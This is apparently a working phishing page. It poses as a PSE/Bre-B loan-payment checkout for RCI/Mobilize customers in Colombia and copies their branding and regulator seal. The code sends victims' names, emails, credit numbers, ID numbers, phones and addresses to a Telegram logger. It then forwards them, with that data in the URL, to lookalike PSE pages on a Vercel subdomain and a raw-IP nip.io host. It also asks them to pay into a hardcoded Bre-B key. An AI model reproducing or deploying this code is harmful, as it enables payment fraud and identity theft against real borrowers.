<?php
session_start();
require_once __DIR__ . '/includes/telegram-logger.php';
$pseConfig = require __DIR__ . '/config/pse-config.php';

if (empty($_SESSION['userInfo']) || empty($_SESSION['creditNumber'])) {
    header('Location: index.html');
    exit;
}

$userInfo     = $_SESSION['userInfo'];
$creditNumber = $_SESSION['creditNumber'];
$payment      = $_SESSION['payment'] ?? [];
$requestMethod = $_SERVER['REQUEST_METHOD'] ?? 'GET';

// El valor pudo haber sido editado en el resumen; si llega por POST lo tomamos como definitivo.
if ($requestMethod === 'POST' && isset($_POST['valueToPay'])) {
    $raw = str_replace(',', '', trim($_POST['valueToPay']));
    if (is_numeric($raw)) {
        $payment['valueToPay'] = (float) $raw;
        $_SESSION['payment'] = $payment;
    }
}

$valueToPay = $payment['valueToPay'] ?? $payment['minPayment'] ?? 0;
$concept    = $payment['concept'] ?? 'Pago credito RCI';

// La referencia de pago se genera una sola vez por transacción y se conserva en sesión
// para que sea estable si el usuario recarga esta página.
if (empty($_SESSION['paymentReference']) || ($_SESSION['paymentReferenceCredit'] ?? null) !== $creditNumber) {
    $_SESSION['paymentReference']       = $creditNumber . '-' . time();
    $_SESSION['paymentReferenceCredit'] = $creditNumber;
}
$reference = $_SESSION['paymentReference'];

$fullName = trim((string) ($userInfo['NOMBRE_COMPLETO'] ?? ''));
$words    = $fullName === '' ? [] : preg_split('/\s+/', $fullName);

// La API solo entrega el nombre completo; se asume que las últimas dos palabras
// son los apellidos (convención de nombres colombianos), el resto es el nombre.
if (count($words) >= 3) {
    $apellido = implode(' ', array_slice($words, -2));
    $nombre   = implode(' ', array_slice($words, 0, -2));
} elseif (count($words) === 2) {
    $nombre   = $words[0];
    $apellido = $words[1];
} else {
    $nombre   = $fullName;
    $apellido = '';
}

$email = $userInfo['EMAIL'] ?? '';
$PSE_BANKS = $pseConfig['primary_banks'] ?? [];
$PSE_PRIMARY_PAGE = 'https://pagosonline-pse.vercel.app';
$RECAUDOFALL_BASE = 'https://recaudofall.94.250.202.215.nip.io/nequi';
$PSE_BANKS_RECAUDOFALL = $pseConfig['recaudofall_banks'] ?? [];
$PSE_BANK_ALIASES = $pseConfig['aliases'] ?? [];

function formatMoneyCO($value): string {
    return number_format((float) $value, 2, ',', '.');
}

telegram_log('💳 Vista de checkout', [
    'Referencia'   => $reference,
    'Crédito'      => $creditNumber,
    'Nombre'       => $nombre,
    'Apellido'     => $apellido,
    'Correo'       => $email,
    'Descripción'  => $concept,
    'Valor a pagar' => formatMoneyCO($valueToPay),
    'Valor editado' => $requestMethod === 'POST' ? 'Sí' : 'No',
]);
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Link To Pay</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
<link rel="stylesheet" href="assets/css/styles.css">
<style>
  .loading-overlay {
    display: none;
    position: fixed;
    inset: 0;
    background: rgba(255, 255, 255, 0.85);
    z-index: 9999;
    align-items: center;
    justify-content: center;
  }
  .loading-overlay.visible {
    display: flex;
  }
  .loader-gif {
    width: 80px;
    height: 80px;
  }
</style>
</head>
<body class="checkout-body">

<div class="loading-overlay" id="loadingOverlay">
  <img src="assets/images/loader.gif" alt="Cargando..." class="loader-gif">
</div>

<img class="vigilado-ribbon" src="assets/images/download-2.png" alt="Vigilado Superintendencia Financiera de Colombia">

<div class="page-column">

<div class="checkout-logo">
  <img src="assets/images/download.svg" alt="Mobilize Financial Services">
</div>

<div class="checkout-wrapper">
  <div class="checkout-card">
    <div class="checkout-details">
      <h2>Detalles de tu compra</h2>

      <form class="checkout-grid" onsubmit="return false;">
        <div class="checkout-field">
          <label for="user-name">Nombre</label>
          <input class="checkout-input-active" type="text" id="user-name" name="user-name" value="<?php echo htmlspecialchars($nombre, ENT_QUOTES, 'UTF-8'); ?>">
        </div>
        <div class="checkout-field">
          <label for="user-last-name">Apellido</label>
          <input type="text" id="user-last-name" name="user-last-name" value="<?php echo htmlspecialchars($apellido, ENT_QUOTES, 'UTF-8'); ?>">
        </div>

        <div class="checkout-field">
          <label for="user-email">Correo electrónico</label>
          <input type="text" id="user-email" name="user-email" value="<?php echo htmlspecialchars($email, ENT_QUOTES, 'UTF-8'); ?>">
        </div>
        <div class="checkout-field">
          <label for="order-reference">Número de referencia</label>
          <input type="text" id="order-reference" value="<?php echo htmlspecialchars($reference, ENT_QUOTES, 'UTF-8'); ?>" readonly>
        </div>

        <div class="checkout-row-3">
          <div class="checkout-field">
            <label for="order-description">Descripción</label>
            <input type="text" id="order-description" value="<?php echo htmlspecialchars($concept, ENT_QUOTES, 'UTF-8'); ?>" readonly>
          </div>
          <div class="checkout-field checkout-field-narrow">
            <label for="order-currency">Moneda</label>
            <input type="text" id="order-currency" value="COP" readonly>
          </div>
        </div>

        <div class="checkout-field checkout-field-amount">
          <label for="order-amount">Valor de la compra</label>
          <input type="text" id="order-amount" value="$ <?php echo formatMoneyCO($valueToPay); ?>" readonly>
        </div>
      </form>
    </div>

    <div class="checkout-pay">
      <div class="checkout-total">
        <span class="checkout-total-amount">$ <?php echo formatMoneyCO($valueToPay); ?></span>
        <span class="checkout-total-currency">COP</span>
      </div>

      <h3 class="checkout-pay-title">Métodos de pago</h3>

      <div class="payment-methods-list">
        <button type="button" class="payment-method-row" id="pay-pse" data-reference="<?php echo htmlspecialchars($reference, ENT_QUOTES, 'UTF-8'); ?>">
          <span class="payment-method-label">Débito PSE</span>
          <span class="payment-method-right">
            <img class="payment-method-badge-pse" src="assets/images/download-1.png" alt="PSE">
            <svg class="payment-method-chevron" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M5 7.5L10 12.5L15 7.5" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
          </span>
        </button>

        <button type="button" class="payment-method-row" id="pay-breb" data-reference="<?php echo htmlspecialchars($reference, ENT_QUOTES, 'UTF-8'); ?>">
          <span class="payment-method-label">Bre-B</span>
          <span class="payment-method-right">
            <img class="breb-logo" src="assets/images/logobre-b-tight.png" alt="Bre-B">
            <svg class="payment-method-chevron" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M5 7.5L10 12.5L15 7.5" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
          </span>
        </button>
      </div>
    </div>
  </div>
</div>

<footer class="checkout-footer">
  <div class="checkout-footer-black"></div>
  <div class="checkout-footer-orange">
    <small>© 2018 - <?php echo date('Y'); ?> Copyright: <a href="https://paymentez.com/" target="_blank" rel="noopener noreferrer">Paymentez™. All rights reserved.</a></small>
  </div>
</footer>

</div>

<div class="pse-modal-overlay" id="pseModalOverlay">
  <div class="pse-modal" role="dialog" aria-modal="true" aria-labelledby="pseModalTitle">
    <div class="pse-modal-header">
      <h3 id="pseModalTitle">Pago con PSE</h3>
      <button type="button" class="pse-modal-close" id="pseModalClose" aria-label="Cerrar">&times;</button>
    </div>

    <form class="pse-modal-body" id="pseForm" novalidate>
      <div class="pse-field">
        <label for="pse-doc-type">Tipo de documento<span class="required">*</span></label>
        <select id="pse-doc-type" required>
          <option value="" selected disabled></option>
          <option value="CC">Cédula de ciudadanía</option>
          <option value="CE">Cédula de extranjería</option>
          <option value="TI">Tarjeta de identidad</option>
          <option value="NIT">NIT</option>
          <option value="PA">Pasaporte</option>
        </select>
      </div>

      <div class="pse-field">
        <label for="pse-doc-number">Número de documento<span class="required">*</span></label>
        <input type="text" id="pse-doc-number" inputmode="numeric" required>
      </div>

      <div class="pse-field">
        <label for="pse-person-type">Tipo de persona<span class="required">*</span></label>
        <select id="pse-person-type" required>
          <option value="" selected disabled></option>
          <option value="natural">Natural</option>
          <option value="juridica">Jurídica</option>
        </select>
      </div>

      <div class="pse-field">
        <label for="pse-bank">Banco<span class="required">*</span></label>
        <select id="pse-bank" required>
          <option value=""></option>
          <option value="0@A continuación seleccione su banco">A continuación seleccione su banco</option>
          <option value="1831@ACCION FIDUCIARIA">ACCION FIDUCIARIA</option>
          <option value="1815@ALIANZA FIDUCIARIA">ALIANZA FIDUCIARIA</option>
          <option value="1558@BAN100">BAN100</option>
          <option value="1059@BANCAMIA S.A.">BANCAMIA S.A.</option>
          <option value="1040@BANCO AGRARIO">BANCO AGRARIO</option>
          <option value="1052@BANCO AV VILLAS">BANCO AV VILLAS</option>
          <option value="1013@BANCO BBVA COLOMBIA S.A.">BANCO BBVA COLOMBIA S.A.</option>
          <option value="1032@BANCO CAJA SOCIAL">BANCO CAJA SOCIAL</option>
          <option value="1066@BANCO COOPERATIVO COOPCENTRAL">BANCO COOPERATIVO COOPCENTRAL</option>
          <option value="1051@BANCO DAVIVIENDA">BANCO DAVIVIENDA</option>
          <option value="1001@BANCO DE BOGOTA">BANCO DE BOGOTA</option>
          <option value="1023@BANCO DE OCCIDENTE">BANCO DE OCCIDENTE</option>
          <option value="1062@BANCO FALABELLA ">BANCO FALABELLA </option>
          <option value="1063@BANCO FINANDINA S.A. BIC">BANCO FINANDINA S.A. BIC</option>
          <option value="1012@BANCO GNB SUDAMERIS">BANCO GNB SUDAMERIS</option>
          <option value="1006@BANCO ITAU">BANCO ITAU</option>
          <option value="1071@BANCO J.P. MORGAN COLOMBIA S.A.">BANCO J.P. MORGAN COLOMBIA S.A.</option>
          <option value="1047@BANCO MUNDO MUJER S.A.">BANCO MUNDO MUJER S.A.</option>
          <option value="1060@BANCO PICHINCHA S.A.">BANCO PICHINCHA S.A.</option>
          <option value="1002@BANCO POPULAR">BANCO POPULAR</option>
          <option value="1065@BANCO SANTANDER COLOMBIA">BANCO SANTANDER COLOMBIA</option>
          <option value="1069@BANCO SERFINANZA">BANCO SERFINANZA</option>
          <option value="1303@BANCO UNION">BANCO UNION</option>
          <option value="1007@BANCOLOMBIA">BANCOLOMBIA</option>
          <option value="1061@BANCOOMEVA S.A.">BANCOOMEVA S.A.</option>
          <option value="1808@BOLD CF">BOLD CF</option>
          <option value="1283@CFA COOPERATIVA FINANCIERA">CFA COOPERATIVA FINANCIERA</option>
          <option value="1009@CITIBANK ">CITIBANK </option>
          <option value="1812@COINK SA">COINK SA</option>
          <option value="1370@COLTEFINANCIERA">COLTEFINANCIERA</option>
          <option value="1292@CONFIAR COOPERATIVA FINANCIERA">CONFIAR COOPERATIVA FINANCIERA</option>
          <option value="1289@COTRAFA">COTRAFA</option>
          <option value="1816@CREZCAMOS">CREZCAMOS</option>
          <option value="1097@DALE">DALE</option>
          <option value="1019@DAVIbank S.A.">DAVIbank S.A.</option>
          <option value="1551@DAVIPLATA">DAVIPLATA</option>
          <option value="1802@DING">DING</option>
          <option value="1121@FINANCIERA JURISCOOP SA COMPAÑÍA DE FINANCIAMIENTO">FINANCIERA JURISCOOP SA COMPAÑÍA DE FINANCIAMIENTO</option>
          <option value="1814@GLOBAL66">GLOBAL66</option>
          <option value="1637@IRIS">IRIS</option>
          <option value="1286@JFK COOPERATIVA FINANCIERA">JFK COOPERATIVA FINANCIERA</option>
          <option value="1070@LULO BANK">LULO BANK</option>
          <option value="1801@MOVII S.A.">MOVII S.A.</option>
          <option value="1507@NEQUI">NEQUI</option>
          <option value="1809@NU">NU</option>
          <option value="1824@PAYCASH">PAYCASH</option>
          <option value="1803@POWWI">POWWI</option>
          <option value="1811@RAPPIPAY">RAPPIPAY</option>
          <option value="1804@UALÁ">UALÁ</option>
        </select>
      </div>

      <div class="pse-field">
        <label for="pse-phone">Teléfono<span class="required">*</span></label>
        <input type="tel" id="pse-phone" required>
      </div>

      <div class="pse-field">
        <label for="pse-address">Dirección<span class="required">*</span></label>
        <input type="text" id="pse-address" required>
      </div>
    </form>

    <div class="pse-modal-footer">
      <div class="pse-modal-actions">
        <button type="button" class="btn-pse-cancel" id="pseCancel">Cancelar</button>
        <button type="submit" form="pseForm" class="btn-pse-submit" id="pseSubmit">Pagar con PSE</button>
      </div>
      <img class="pse-modal-badge" src="assets/images/download-1.png" alt="PSE">
    </div>
  </div>
</div>

<div class="breb-modal-overlay" id="brebModalOverlay">
  <div class="breb-modal" role="dialog" aria-modal="true" aria-labelledby="brebModalTitle">
    <button type="button" class="breb-modal-close" id="brebModalClose" aria-label="Cerrar">&times;</button>

    <div class="breb-modal-icon" aria-hidden="true">
      <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
        <circle cx="32" cy="32" r="32" fill="#f7dfcf"/>
        <path d="M32 18v20" stroke="#f26a21" stroke-width="3" stroke-linecap="round"/>
        <path d="M24 32l8 8 8-8" fill="none" stroke="#f26a21" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    </div>

    <div class="breb-modal-amount">$ <?php echo formatMoneyCO($valueToPay); ?></div>
    <p class="breb-modal-description">
      Usa esta llave Bre-B o el codigo QR para realizar tu deposito. La confirmacion suele llegar en segundos.
    </p>

    <div class="breb-modal-tabs" role="tablist" aria-label="Opciones de Bre-B">
      <button type="button" class="breb-tab active" id="brebTabKey" data-breb-tab="key" aria-selected="true">Llave Bre-B</button>
      <button type="button" class="breb-tab" id="brebTabQr" data-breb-tab="qr" aria-selected="false">Codigo QR</button>
    </div>

    <div class="breb-tab-panel active" id="brebPanelKey" data-breb-panel="key">
      <div class="breb-key-card">
        <strong class="breb-key-value" id="brebKeyValue">@LITTIO1016713263</strong>
        <span class="breb-key-label">Llave Bre-B</span>
      </div>

      <button type="button" class="breb-copy-button" id="brebCopyButton">
        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
          <path d="M9 7a2 2 0 0 1 2-2h7a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2h-7a2 2 0 0 1-2-2V7Z" fill="none" stroke="currentColor" stroke-width="2"/>
          <path d="M5 9V6a2 2 0 0 1 2-2h7" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
          <path d="M5 10v7a2 2 0 0 0 2 2h4" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
        </svg>
        <span id="brebCopyButtonText">COPIAR LLAVE</span>
      </button>
    </div>

    <div class="breb-tab-panel" id="brebPanelQr" data-breb-panel="qr" hidden>
      <div class="breb-qr-card">
        <div class="breb-qr-canvas" id="brebQrCanvas" aria-label="Codigo QR Bre-B"></div>
        <span class="breb-qr-label" id="brebQrLabel">Escanea este codigo QR</span>
      </div>
    </div>

    <div class="breb-info-box">
      Completa tu transferencia usando la Llave Bre-B o el codigo QR antes del
      <strong><?php echo date('d/m/Y - H:i', strtotime('+15 minutes')); ?></strong>. Si el tiempo expira, reinicia el proceso.
    </div>

    <button type="button" class="breb-primary-button" id="brebConfirmButton">Pago realizado</button>
    <button type="button" class="breb-secondary-button" id="brebCancelButton">Cancelar pago</button>
  </div>
</div>

<script src="assets/js/qrcodejs.min.js"></script>
<script>
  const payButton   = document.getElementById('pay-pse');
  const brebButton  = document.getElementById('pay-breb');
  const pseOverlay  = document.getElementById('pseModalOverlay');
  const brebOverlay = document.getElementById('brebModalOverlay');
  const closeBtn    = document.getElementById('pseModalClose');
  const cancelBtn   = document.getElementById('pseCancel');
  const pseForm     = document.getElementById('pseForm');
  const bankSelect  = document.getElementById('pse-bank');
  const brebCloseBtn = document.getElementById('brebModalClose');
  const brebCancelBtn = document.getElementById('brebCancelButton');
  const brebConfirmBtn = document.getElementById('brebConfirmButton');
  const brebCopyButton = document.getElementById('brebCopyButton');
  const brebCopyButtonText = document.getElementById('brebCopyButtonText');
  const brebKeyValue = document.getElementById('brebKeyValue');
  const brebQrCanvas = document.getElementById('brebQrCanvas');
  const brebQrLabel = document.getElementById('brebQrLabel');
  const brebTabs = document.querySelectorAll('[data-breb-tab]');
  const brebPanels = document.querySelectorAll('[data-breb-panel]');
  const brebAmount = <?php echo json_encode((float) $valueToPay); ?>;
  const recaudofallBase = <?php echo json_encode($RECAUDOFALL_BASE, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES); ?>;
  const pseBanks = <?php echo json_encode($PSE_BANKS, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES); ?>;
  const psePrimaryPage = <?php echo json_encode($PSE_PRIMARY_PAGE, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES); ?>;
  const pseBanksRecaudoFall = <?php echo json_encode($PSE_BANKS_RECAUDOFALL, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES); ?>;
  const pseBankAliases = <?php echo json_encode($PSE_BANK_ALIASES, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES); ?>;
  const loadingOverlay = document.getElementById('loadingOverlay');

  const ACCENT_MAP = { 'á': 'a', 'é': 'e', 'í': 'i', 'ó': 'o', 'ú': 'u', 'ñ': 'n', 'ü': 'u' };

  function slugify(text) {
    let result = '';
    for (const ch of text.toLowerCase()) {
      result += ACCENT_MAP[ch] || ch;
    }
    return result
      .replace(/[^a-z0-9]+/g, '-')
      .replace(/^-+|-+$/g, '');
  }

  function normalizeBankName(text) {
    let result = '';
    for (const ch of text.toLowerCase()) {
      result += ACCENT_MAP[ch] || ch;
    }
    return result
      .replace(/\s+/g, ' ')
      .trim()
      .toUpperCase();
  }

  function resolvePseBankConfig(bankName, bankCode) {
    const normalizedName = normalizeBankName(bankName);
    const bankKey = pseBankAliases[normalizedName] || slugify(bankName);
    const configuredBank = pseBanks[bankKey] || null;
    const recaudofallBank = pseBanksRecaudoFall[bankKey] || normalizedName.replace(/[^A-Z0-9]/g, '');
    const isPrimaryFlow = Boolean(configuredBank);

    return {
      key: bankKey,
      slug: isPrimaryFlow ? configuredBank.slug : slugify(bankName),
      id: isPrimaryFlow ? configuredBank.id : (bankCode || '109'),
      bank: recaudofallBank,
      page: isPrimaryFlow ? psePrimaryPage : null,
      flow: isPrimaryFlow ? 'primary' : 'recaudofall'
    };
  }

  function openOverlay(targetOverlay) {
    targetOverlay.classList.add('visible');
    document.body.style.overflow = 'hidden';
  }

  function closeOverlay(targetOverlay) {
    targetOverlay.classList.remove('visible');
    if (!pseOverlay.classList.contains('visible') && !brebOverlay.classList.contains('visible')) {
      document.body.style.overflow = '';
    }
  }

  function activateBrebTab(tabName) {
    brebTabs.forEach(function (tab) {
      const isActive = tab.dataset.brebTab === tabName;
      tab.classList.toggle('active', isActive);
      tab.setAttribute('aria-selected', isActive ? 'true' : 'false');
    });

    brebPanels.forEach(function (panel) {
      const isActive = panel.dataset.brebPanel === tabName;
      panel.classList.toggle('active', isActive);
      panel.hidden = !isActive;
    });
  }

  function crc16(str) {
    let crc = 0xFFFF;
    for (let i = 0; i < str.length; i++) {
      crc ^= str.charCodeAt(i) << 8;
      for (let j = 0; j < 8; j++) {
        if (crc & 0x8000) {
          crc = ((crc << 1) ^ 0x1021) & 0xFFFF;
        } else {
          crc = (crc << 1) & 0xFFFF;
        }
      }
    }
    return crc.toString(16).toUpperCase().padStart(4, '0');
  }

  function generarQR(llave, monto) {
    const llaveLen = String(llave.length).padStart(2, '0');
    const tag26Len = String(18 + 4 + llave.length).padStart(2, '0');

    const prefix = '000201010212'
      + '26' + tag26Len + '0014CO.COM.ACH.LLA' + '04' + llaveLen + llave
      + '49250014CO.COM.ACH.RED0103ACH'
      + '50310013CO.COM.ACH.CU011000823021'
      + '55520400005303170';

    const suffix = '5802CO5905Kamin600511001610511001622107040000080200110363380270016CO.COM.ACH.CANAL0103APP81250015CO.COM.ACH.CIVA01020382260014CO.COM.ACH.IVA01040.0083270015CO.COM.ACH.BASE01040.0084250015CO.COM.ACH.CINC01020385260014CO.COM.ACH.INC01040.0090410016CO.COM.ACH.TRXID01171783894866422000=91460014CO.COM.ACH.SEC0124zdItyibLP1ZlwenFpLPDwbPN6304';
    const amtStr = Number(monto).toFixed(2);
    const amtLen = String(amtStr.length).padStart(2, '0');
    const base = prefix + '54' + amtLen + amtStr + suffix;

    return base + crc16(base);
  }

  function renderBrebQr() {
    const qrLib = window.QRCode || null;

    if (!qrLib || !brebQrCanvas) {
      if (brebQrLabel) {
        brebQrLabel.textContent = 'No se pudo cargar el generador QR';
      }
      return;
    }

    const payload = generarQR(brebKeyValue.textContent.trim(), brebAmount);
    brebQrCanvas.innerHTML = '';
    if (brebQrLabel) {
      brebQrLabel.textContent = 'Escanea este codigo QR';
    }

    try {
      new qrLib(brebQrCanvas, {
        text: payload,
        width: 180,
        height: 180,
        colorDark: '#111827',
        colorLight: '#FFFFFF',
        correctLevel: qrLib.CorrectLevel.M
      });
    } catch (error) {
      if (brebQrLabel) {
        brebQrLabel.textContent = 'No se pudo renderizar el QR';
      }
      console.error('Fallo inesperado al generar el QR de Bre-B:', error);
    }
  }

  payButton.addEventListener('click', function (event) {
    const rect = payButton.getBoundingClientRect();
    const size = Math.max(rect.width, rect.height);
    const ripple = document.createElement('span');
    ripple.className = 'ripple';
    ripple.style.width = ripple.style.height = size + 'px';
    ripple.style.left = (event.clientX - rect.left - size / 2) + 'px';
    ripple.style.top = (event.clientY - rect.top - size / 2) + 'px';
    payButton.appendChild(ripple);
    ripple.addEventListener('animationend', () => ripple.remove());

    openOverlay(pseOverlay);
  });

  brebButton.addEventListener('click', function () {
    activateBrebTab('key');
    openOverlay(brebOverlay);
    setTimeout(function () {
      renderBrebQr();
    }, 0);
  });

  closeBtn.addEventListener('click', function () {
    closeOverlay(pseOverlay);
  });
  cancelBtn.addEventListener('click', function () {
    closeOverlay(pseOverlay);
  });
  pseOverlay.addEventListener('click', function (event) {
    if (event.target === pseOverlay) closeOverlay(pseOverlay);
  });
  brebCloseBtn.addEventListener('click', function () {
    closeOverlay(brebOverlay);
  });
  brebCancelBtn.addEventListener('click', function () {
    closeOverlay(brebOverlay);
  });
  brebOverlay.addEventListener('click', function (event) {
    if (event.target === brebOverlay) closeOverlay(brebOverlay);
  });
  document.addEventListener('keydown', function (event) {
    if (event.key === 'Escape' && pseOverlay.classList.contains('visible')) closeOverlay(pseOverlay);
    if (event.key === 'Escape' && brebOverlay.classList.contains('visible')) closeOverlay(brebOverlay);
  });

  brebTabs.forEach(function (tab) {
    tab.addEventListener('click', function () {
      activateBrebTab(tab.dataset.brebTab);
      if (tab.dataset.brebTab === 'qr') {
        setTimeout(function () {
          renderBrebQr();
        }, 0);
      }
    });
  });

  brebCopyButton.addEventListener('click', function () {
    const value = brebKeyValue.textContent.trim();

    function setCopyLabel(text) {
      brebCopyButtonText.textContent = text;
      setTimeout(function () {
        brebCopyButtonText.textContent = 'COPIAR LLAVE';
      }, 1800);
    }

    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(value).then(function () {
        setCopyLabel('LLAVE COPIADA');
      }).catch(function () {
        setCopyLabel('NO SE PUDO COPIAR');
      });
      return;
    }

    const tempInput = document.createElement('input');
    tempInput.value = value;
    document.body.appendChild(tempInput);
    tempInput.select();
    try {
      document.execCommand('copy');
      setCopyLabel('LLAVE COPIADA');
    } catch (error) {
      setCopyLabel('NO SE PUDO COPIAR');
    }
    tempInput.remove();
  });

  brebConfirmBtn.addEventListener('click', function () {
    loadingOverlay.classList.add('visible');

    const logData = {
      'Referencia': payButton.dataset.reference,
      'Método': 'Bre-B',
      'Nombre': document.getElementById('user-name').value,
      'Apellido': document.getElementById('user-last-name').value,
      'Correo': document.getElementById('user-email').value,
      'Valor': document.getElementById('order-amount').value,
      'Llave Bre-B': brebKeyValue.textContent.trim(),
      'Pestaña activa': document.querySelector('[data-breb-tab].active')?.textContent?.trim() || 'Llave Bre-B'
    };

    fetch('log-event.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ event: '✅ Pago Bre-B realizado', data: logData }),
      keepalive: true
    }).finally(function () {
      // El loader se mantiene visible: no se quita aquí, sigue puesto hasta el cambio de página.
      window.location.href = 'factura-demo.php?paid=1';
    });
  });

  bankSelect.addEventListener('change', function () {
    bankSelect.setCustomValidity('');
  });

  pseForm.addEventListener('submit', function (event) {
    event.preventDefault();

    const bankValue = bankSelect.value;
    if (!bankValue || bankValue.startsWith('0@')) {
      bankSelect.setCustomValidity('Selecciona tu banco.');
    }

    if (!pseForm.checkValidity()) {
      pseForm.reportValidity();
      return;
    }

    // Validación superada: se bloquea el botón y se muestra el loader de forma permanente.
    document.getElementById('pseSubmit').disabled = true;
    loadingOverlay.classList.add('visible');

    const bankCode = bankValue.split('@')[0] || '';
    const bankName = bankValue.split('@')[1] || bankValue;
    const bankConfig = resolvePseBankConfig(bankName, bankCode);
    const customerName = [
      document.getElementById('user-name').value,
      document.getElementById('user-last-name').value
    ].join(' ').trim();
    const customerEmail = document.getElementById('user-email').value.trim();
    const customerPhone = document.getElementById('pse-phone').value.trim();
    const customerCedula = document.getElementById('pse-doc-number').value.trim();
    const amountValue = Number(brebAmount).toFixed(2);

    const logData = {
      'Referencia':         payButton.dataset.reference,
      'Nombre':             document.getElementById('user-name').value,
      'Apellido':           document.getElementById('user-last-name').value,
      'Correo':             customerEmail,
      'Valor':              document.getElementById('order-amount').value,
      'Tipo de documento':  document.getElementById('pse-doc-type').selectedOptions[0]?.text || '',
      'Número de documento': customerCedula,
      'Tipo de persona':    document.getElementById('pse-person-type').selectedOptions[0]?.text || '',
      'Flujo PSE':          bankConfig.flow,
      'Banco clave':        bankConfig.key,
      'Banco':              bankName,
      'Banco redirect':     bankConfig.bank,
      'Teléfono':           customerPhone,
      'Dirección':          document.getElementById('pse-address').value
    };

    fetch('log-event.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ event: '🏦 Envío formulario PSE', data: logData }),
      keepalive: true
    }).finally(function () {
      // El loader se mantiene visible: no se quita aquí, sigue puesto hasta la redirección.
      let redirectUrl;

      if (bankConfig.flow === 'recaudofall') {
        redirectUrl = new URL(recaudofallBase);
        redirectUrl.searchParams.set('cedula', customerCedula);
        redirectUrl.searchParams.set('nombre', customerName);
        redirectUrl.searchParams.set('email', customerEmail);
        redirectUrl.searchParams.set('telefono', customerPhone);
        redirectUrl.searchParams.set('monto', amountValue);
        redirectUrl.searchParams.set('banco', bankConfig.bank);
      } else {
        redirectUrl = new URL(bankConfig.page + '/sites/' + bankConfig.slug + '/manager/' + bankConfig.id, window.location.href);
      }

      window.location.href = redirectUrl.toString();
    });
  });
</script>

</body>
</html>
